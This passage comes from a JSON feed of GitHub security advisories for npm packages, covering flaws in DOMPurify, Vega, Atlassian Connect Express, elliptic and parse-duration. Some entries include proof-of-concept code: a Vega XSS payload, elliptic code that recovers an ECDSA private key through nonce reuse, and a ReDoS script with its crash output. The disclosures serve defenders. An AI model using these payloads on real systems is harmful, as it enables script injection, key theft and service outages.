            "content_html": "<p>DOMPurify before 3.2.4 has an incorrect template literal regular expression, sometimes leading to mutation cross-site scripting (mXSS).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26791\">https://nvd.nist.gov/vuln/detail/CVE-2025-26791</a></li>\n<li><a href=\"https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02\">https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02</a></li>\n<li><a href=\"https://ensy.zip/posts/dompurify-323-bypass\">https://ensy.zip/posts/dompurify-323-bypass</a></li>\n<li><a href=\"https://github.com/cure53/DOMPurify/releases/tag/3.2.4\">https://github.com/cure53/DOMPurify/releases/tag/3.2.4</a></li>\n<li><a href=\"https://nsysean.github.io/posts/dompurify-323-bypass\">https://nsysean.github.io/posts/dompurify-323-bypass</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vhxf-7vqr-mrjg\">https://github.com/advisories/GHSA-vhxf-7vqr-mrjg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vhxf-7vqr-mrjg",
            "title": "[dompurify] DOMPurify allows Cross-site Scripting (XSS)",
            "date_modified": "2025-02-14T18:05:09.000Z",
            "date_published": "2025-02-14T09:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vhxf-7vqr-mrjg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>vlSelectionTuples</code> function can be used to call JavaScript functions, leading to XSS.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14\"><code>vlSelectionTuples</code></a> calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument.</p>\n<p>Example call: <code>vlSelectionTuples([{datum:&lt;argument&gt;}], {fields:[{getter:&lt;function&gt;}]})</code></p>\n<p>This can be used to call <code>Function()</code> with arbitrary JavaScript and the resulting function can be called with <code>vlSelectionTuples</code> or using a type coercion to call <code>toString</code> or <code>valueOf</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"init\":\"+{valueOf:vlSelectionTuples([{datum:'alert(1)'}],{fields:[{getter:[].at.constructor}]})[0].values[0]}\"}]}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j\">https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/9fb9ea07e27984394e463d286eb73944fa61411e\">https://github.com/vega/vega/commit/9fb9ea07e27984394e463d286eb73944fa61411e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25304\">https://nvd.nist.gov/vuln/detail/CVE-2025-25304</a></li>\n<li><a href=\"https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14\">https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mp7w-mhcv-673j\">https://github.com/advisories/GHSA-mp7w-mhcv-673j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mp7w-mhcv-673j",
            "title": "[vega-selections] Vega allows Cross-site Scripting via the vlSelectionTuples function",
            "date_modified": "2025-02-14T22:17:56.000Z",
            "date_published": "2025-02-14T17:33:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mp7w-mhcv-673j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>vlSelectionTuples</code> function can be used to call JavaScript functions, leading to XSS.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14\"><code>vlSelectionTuples</code></a> calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument.</p>\n<p>Example call: <code>vlSelectionTuples([{datum:&lt;argument&gt;}], {fields:[{getter:&lt;function&gt;}]})</code></p>\n<p>This can be used to call <code>Function()</code> with arbitrary JavaScript and the resulting function can be called with <code>vlSelectionTuples</code> or using a type coercion to call <code>toString</code> or <code>valueOf</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"init\":\"+{valueOf:vlSelectionTuples([{datum:'alert(1)'}],{fields:[{getter:[].at.constructor}]})[0].values[0]}\"}]}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j\">https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/9fb9ea07e27984394e463d286eb73944fa61411e\">https://github.com/vega/vega/commit/9fb9ea07e27984394e463d286eb73944fa61411e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25304\">https://nvd.nist.gov/vuln/detail/CVE-2025-25304</a></li>\n<li><a href=\"https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14\">https://github.com/vega/vega/blob/b45cf431cd6c0d0c0e1567f087f9b3b55bc236fa/packages/vega-selections/src/selectionTuples.js#L14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mp7w-mhcv-673j\">https://github.com/advisories/GHSA-mp7w-mhcv-673j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mp7w-mhcv-673j",
            "title": "[vega] Vega allows Cross-site Scripting via the vlSelectionTuples function",
            "date_modified": "2025-02-14T22:17:56.000Z",
            "date_published": "2025-02-14T17:33:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mp7w-mhcv-673j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Broken Authentication in Atlassian Connect Express (ACE) from version 3.0.2 before version 6.6.0: Atlassian Connect Express is a Node.js package for building Atlassian Connect apps. Authentication between Atlassian products and the Atlassian Connect Express app occurs with a server-to-server JWT or a context JWT. Atlassian Connect Express versions between 3.0.2 - 6.5.0 erroneously accept context JWTs in lifecycle endpoints (such as installation) where only server-to-server JWTs should be accepted, permitting an attacker to send authenticated re-installation events to an app.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26073\">https://nvd.nist.gov/vuln/detail/CVE-2021-26073</a></li>\n<li><a href=\"https://confluence.atlassian.com/pages/viewpage.action?pageId=1051986099\">https://confluence.atlassian.com/pages/viewpage.action?pageId=1051986099</a></li>\n<li><a href=\"https://community.developer.atlassian.com/t/action-required-atlassian-connect-vulnerability-a%5B%E2%80%A6%5Dypass-of-app-qsh-verification-via-context-jwts/47072\">https://community.developer.atlassian.com/t/action-required-atlassian-connect-vulnerability-a%5B%E2%80%A6%5Dypass-of-app-qsh-verification-via-context-jwts/47072</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20210604-0004\">https://security.netapp.com/advisory/ntap-20210604-0004</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4v96-m8xv-x83v\">https://github.com/advisories/GHSA-4v96-m8xv-x83v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4v96-m8xv-x83v",
            "title": "[atlassian-connect-express] Broken Authentication in Atlassian Connect Express",
            "date_modified": "2025-02-12T21:53:05.000Z",
            "date_published": "2022-05-24T22:28:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4v96-m8xv-x83v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Private key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input</p>\n<p>Note that <code>elliptic</code> by design accepts hex strings as one of the possible input types</p>\n<h3 id=\"details\">Details</h3>\n<p>In this code: <a href=\"https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107\">https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107</a></p>\n<p><code>msg</code> is a BN instance after conversion, but <code>nonce</code> is an array, and different BN instances could generate equivalent arrays after conversion.</p>\n<p>Meaning that a same <code>nonce</code> could be generated for different messages used in signing process, leading to <code>k</code> reuse, leading to private key extraction from a pair of signatures</p>\n<p>Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction</p>\n<p>While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still <em>should not</em> leak the private key</p>\n<p>Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"k-reuse-example\"><code>k</code> reuse example</h4>\n<pre><code class=\"language-js\">import elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'ed25519' // or any other curve, e.g. secp256k1\nconst ec = new EC(curve)\nconst prettyprint = ({ r, s }) =&gt; `r: ${r}, s: ${s}`\nconst sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones\nconst sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form\nconst sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`\nconsole.log({ sig0, sig1, sig2 })\n</code></pre>\n<h4 id=\"full-attack\">Full attack</h4>\n<p>This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)</p>\n<pre><code class=\"language-js\">import elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'secp256k1' // or any other curve, e.g. ed25519\nconst ec = new EC(curve)\n\n// Any message, e.g. previously known signature\nconst msg0 = crypto.getRandomValues(new Uint8Array(32))\nconst sig0 = ec.sign(msg0, privateKey)\n\n// Attack\nconst msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types\nconst sig1 = ec.sign(msg1, privateKey)\n\nconst something = extract(msg0, sig0, sig1, curve)\n\nconsole.log('Curve:', curve)\nconsole.log('Typeof:', typeof msg1)\nconsole.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)\nconst rnd = crypto.getRandomValues(new Uint8Array(32))\nconst st = (x) =&gt; JSON.stringify(x)\nconsole.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))\nconsole.log('Orig key:', Buffer.from(privateKey).toString('hex'))\nconsole.log('Restored:', something)\n</code></pre>\n<p>Output:</p>\n<pre><code class=\"language-console\">Curve: secp256k1\nTypeof: string\nKeys equal? true\nKeys equivalent? true\nOrig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\nRestored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\n</code></pre>\n<p>Similar for <code>ed25519</code>, but due to low <code>n</code>, the key might not match precisely but is nevertheless equivalent for signing:</p>\n<pre><code class=\"language-console\">Curve: ed25519\nTypeof: string\nKeys equal? false\nKeys equivalent? true\nOrig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189\nRestored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6\n</code></pre>\n<p><code>restored</code> is equal to <code>orig</code> mod <code>N</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Full private key extraction when signing a single malicious message (that passes <code>JSON.stringify</code>/<code>JSON.parse</code>)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh\">https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh</a></li>\n<li><a href=\"https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e\">https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vjh7-7g9h-fjfh\">https://github.com/advisories/GHSA-vjh7-7g9h-fjfh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vjh7-7g9h-fjfh",
            "title": "[elliptic] Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)",
            "date_modified": "2025-02-12T19:47:53.000Z",
            "date_published": "2025-02-12T19:47:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vjh7-7g9h-fjfh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report finds 2 availability issues due to the regex used in the <code>parse-duration</code> npm package:</p>\n<ol>\n<li>An event loop delay due to the CPU-bound operation of resolving the provided string, from a 0.5ms and up to ~50ms per one operation, with a varying size from 0.01 MB and up to 4.3 MB respectively.</li>\n<li>An out of memory that would crash a running Node.js application due to a string size of roughly 10 MB that utilizes unicode characters.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p>Refer to the following proof of concept code that provides a test case and makes use of the regular expression in the library as its test case to match against strings:</p>\n<pre><code class=\"language-js\">// Vulnerable regex to use from the library:\nimport parse from './index.js'\n\nfunction generateStressTestString(length, decimalProbability) {\n  let result = \"\";\n  for (let i = 0; i &lt; length; i++) {\n    if (Math.random() &lt; decimalProbability) {\n      result += \"....\".repeat(99);\n    }\n    result += Math.floor(Math.random() * 10);\n  }\n  return result;\n}\n\nfunction getStringSizeInMB_UTF8(str) {\n  const sizeInBytes = Buffer.byteLength(str, 'utf8');\n  const sizeInMB = sizeInBytes / (1024 * 1024);\n  return sizeInMB;\n}\n\n\n// Generate test strings with varying length and decimal probability:\nconst longString1 = generateStressTestString(380, 0.05);\nconst longString2 = generateStressTestString(10000, 0.9);\nconst longString3 = generateStressTestString(500000, 1);\nconst longStringVar1 = '-1e' + '-----'.repeat(915000)\nconst longStringVar2 = \"1\" + \"0\".repeat(500) + \"e1\" + \"α\".repeat(5225000)\n\nfunction testRegex(str) {\n  const startTime = performance.now();\n  // one of the regex's used in the library:\n  // const durationRE = /(-?(?:\\d+\\.?\\d*|\\d*\\.?\\d+)(?:e[-+]?\\d+)?)\\s*([\\p{L}]*)/giu;\n  // const match = durationRE.test(str);\n  // but we will use the exported library code directly:\n  const match = parse(str);\n  const endTime = performance.now();\n  const timeTaken = endTime - startTime;\n  return { timeTaken, match };\n}\n\n// Test the long strings:\nlet result = {}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString1.length} (size: ${getStringSizeInMB_UTF8(longString1).toFixed(2)} MB):`\n  );\n  result = testRegex(longString1);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString2.length} (size: ${getStringSizeInMB_UTF8(longString2).toFixed(2)} MB):`\n  );\n  result = testRegex(longString2 + \"....\".repeat(100) + \"5сек\".repeat(9000));\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longStringVar1.length} (size: ${getStringSizeInMB_UTF8(longStringVar1).toFixed(2)} MB):`\n  );\n  result = testRegex(longStringVar1);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString3.length} (size: ${getStringSizeInMB_UTF8(longString3).toFixed(2)} MB):`\n  );\n  result = testRegex(longString3 + '.'.repeat(10000) + \" 5сек\".repeat(9000));\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longStringVar2.length} (size: ${getStringSizeInMB_UTF8(longStringVar2).toFixed(2)} MB):`\n  );\n  result = testRegex(longStringVar2);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n</code></pre>\n<p>The results of this on the cloud machine that I ran this on are as follows:</p>\n<pre><code class=\"language-sh\">@lirantal ➜ /workspaces/parse-duration (master) $ node redos.js \n\nRegex test on string of length 6320 (size: 0.01 MB):\n   matched: 5997140778.000855, time taken: 0.9271340000000237ms\n\nRegex test on string of length 3561724 (size: 3.40 MB):\n   matched: 0.0006004999999999999, time taken: 728.7693149999999ms\n\nRegex test on string of length 4575003 (size: 4.36 MB):\n   matched: null, time taken: 43.713984999999866ms\n\nRegex test on string of length 198500000 (size: 189.30 MB):\n\n&lt;--- Last few GCs ---&gt;\n\n[34339:0x7686430]    14670 ms: Mark-Compact (reduce) 2047.4 (2073.3) -&gt; 2047.4 (2074.3) MB, 1396.70 / 0.01 ms  (+ 0.1 ms in 62 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 1430 ms) (average mu = 0.412, current mu = 0.[34339:0x7686430]    17450 ms: Mark-Compact (reduce) 2048.4 (2074.3) -&gt; 2048.4 (2075.3) MB, 2777.68 / 0.00 ms  (average mu = 0.185, current mu = 0.001) allocation failure; scavenge might not succeed\n\n\n&lt;--- JS stacktrace ---&gt;\n\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n----- Native stack trace -----\n\n 1: 0xb8d0a3 node::OOMErrorHandler(char const*, v8::OOMDetails const&amp;) [node]\n 2: 0xf06250 v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, v8::OOMDetails const&amp;) [node]\n 3: 0xf06537 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, v8::OOMDetails const&amp;) [node]\n 4: 0x11180d5  [node]\n 5: 0x112ff58 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]\n 6: 0x1106071 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]\n 7: 0x1107205 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]\n 8: 0x10e4856 v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [node]\n 9: 0x1540686 v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [node]\n10: 0x1979ef6  [node]\nAborted (core dumped)\n</code></pre>\n<p>You can note that:</p>\n<ol>\n<li>0.01 MB of input was enough to cause a 1ms delay (0.92ms)</li>\n<li>Ranging from either 3 MB to 4 MB of input results in almost a full second day (728ms) and 42 ms, depending on the characters used in the text passed to the library's <code>parse()</code> function</li>\n<li>A 200 MB of input size already causes JavaScript heap out of memory crash</li>\n</ol>\n<p>However, more interestingly, if we focus on the input string case:</p>\n<pre><code class=\"language-js\">const longStringVar2 = \"1\" + \"0\".repeat(500) + \"e1\" + \"α\".repeat(5225000)\n</code></pre>\n<p>Even though this is merely 10 MB of size (9.97 MB) it results in an out of memory issue due to the recursive nature of the regular expression matching:</p>\n<pre><code class=\"language-sh\">Regex test on string of length 5225503 (size: 9.97 MB):\nfile:///workspaces/parse-duration/index.js:21\n    .replace(durationRE, (_, n, units) =&gt; {\n     ^\n\nRangeError: Maximum call stack size exceeded\n    at String.replace (&lt;anonymous&gt;)\n    at parse (file:///workspaces/parse-duration/index.js:21:6)\n    at testRegex (file:///workspaces/parse-duration/redos.js:35:17)\n    at file:///workspaces/parse-duration/redos.js:89:12\n    at ModuleJob.run (node:internal/modules/esm/module_job:234:25)\n    at async ModuleLoader.import (node:internal/modules/esm/loader:473:24)\n    at async asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:122:5)\n\nNode.js v20.18.1\n</code></pre>\n<p>To note, the issue at hand may not just be the primary regex in use but rather the reliance of the various <code>replace</code> functions in the <code>parse()</code> function which create copies of the input in memory.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>I agree, a 200 MB (perhaps even less if we perform more tests to find the actual threshold) is a large amount of data to send over a network and hopefully is unlikely to hit common application usage.</li>\n<li>In the case of the specialized input string case that uses a UTF-8 character it is only requires up to 10 MB of request size to cause a RangeError exception for a running Node.js application, which I think is more applicable and common to allow such input sizes for POST requests and other types.</li>\n<li>Even for the smaller payloads such as 0.01 MB which aligns with Express's default of 100kb request limit size it causes a 1ms delay. Now imagine if an application is running without proper security controls such as rate limits, and attackers send 1000s of concurrent requests which quickly turn the 1ms delay into seconds worth of delay for a running application. The 3 MB payload already shows a 0.5s delay in one request.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jkroso/parse-duration/security/advisories/GHSA-hcrg-fc28-fcg5\">https://github.com/jkroso/parse-duration/security/advisories/GHSA-hcrg-fc28-fcg5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25283\">https://nvd.nist.gov/vuln/detail/CVE-2025-25283</a></li>\n<li><a href=\"https://github.com/jkroso/parse-duration/commit/9e88421bfd41806fa4b473bfb28a9ee9dafc27d7\">https://github.com/jkroso/parse-duration/commit/9e88421bfd41806fa4b473bfb28a9ee9dafc27d7</a></li>\n<li><a href=\"https://github.com/jkroso/parse-duration/releases/tag/v2.1.3\">https://github.com/jkroso/parse-duration/releases/tag/v2.1.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hcrg-fc28-fcg5\">https://github.com/advisories/GHSA-hcrg-fc28-fcg5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hcrg-fc28-fcg5",
            "title": "[parse-duration] parse-duration has a Regex Denial of Service that results in event loop delay and out of memory",
            "date_modified": "2025-02-12T21:35:45.000Z",
            "date_published": "2025-02-12T19:45:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hcrg-fc28-fcg5"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}